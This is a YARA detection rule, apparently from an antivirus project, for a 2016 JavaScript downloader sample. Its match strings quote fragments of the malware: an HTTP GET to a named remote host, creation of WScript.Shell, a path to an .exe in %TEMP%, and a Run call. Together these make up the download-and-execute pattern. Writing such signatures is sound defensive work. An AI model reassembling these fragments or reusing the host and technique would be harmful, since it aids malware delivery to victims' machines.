rule sig_20160330_688523c9b268ee4bb871b371dbe4db6b {
  meta:
    description = "datamaliciousorder - file 20160330_688523c9b268ee4bb871b371dbe4db6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d094b33be36508917ea35910be4c889437b1554b601719fb5145d116523d193d"

  strings:
    $s1  = "PT[U](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var MT = function LS() {return WScript[T0](\"WScript\"+\".Shell\");}(), B1 = 11;" fullword ascii
    $s3  = "function Z(Y, ZA){RX = RX * 1; return Y - ZA;};" fullword ascii
    $s4  = "if (PT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T(){return IK + \"\";};" fullword ascii
    $s6  = "function GI() {return MT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"epfG5oDHj.ex\" + \"e\";};" fullword ascii
    $s7  = "function G(QC){MT[\"Run\"](QC, RX, RX);};" fullword ascii
    $s8  = "function A(){return 22;};" fullword ascii
    $s9  = "var L = new this[\"Date\"]();" fullword ascii
    $s10 = "function SK(){return T0;};" fullword ascii
    $s11 = "function PL(K) {var UZ = (1, 2, 3, 4, 5, K); return UZ;};" fullword ascii
    $s12 = "return Z(L0, M0);" fullword ascii
    $s13 = "function PR()" fullword ascii
    $s14 = "}while (B0);" fullword ascii
    $s15 = "function CA() {return ((PU == true) && (PU == PA)) ? 1 : RX;};" fullword ascii
    $s16 = "var G0 = false;" fullword ascii
    $s17 = "PA = true; " fullword ascii
    $s18 = "var PA = false;" fullword ascii
    $s19 = "PU = true; " fullword ascii
    $s20 = "var PU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}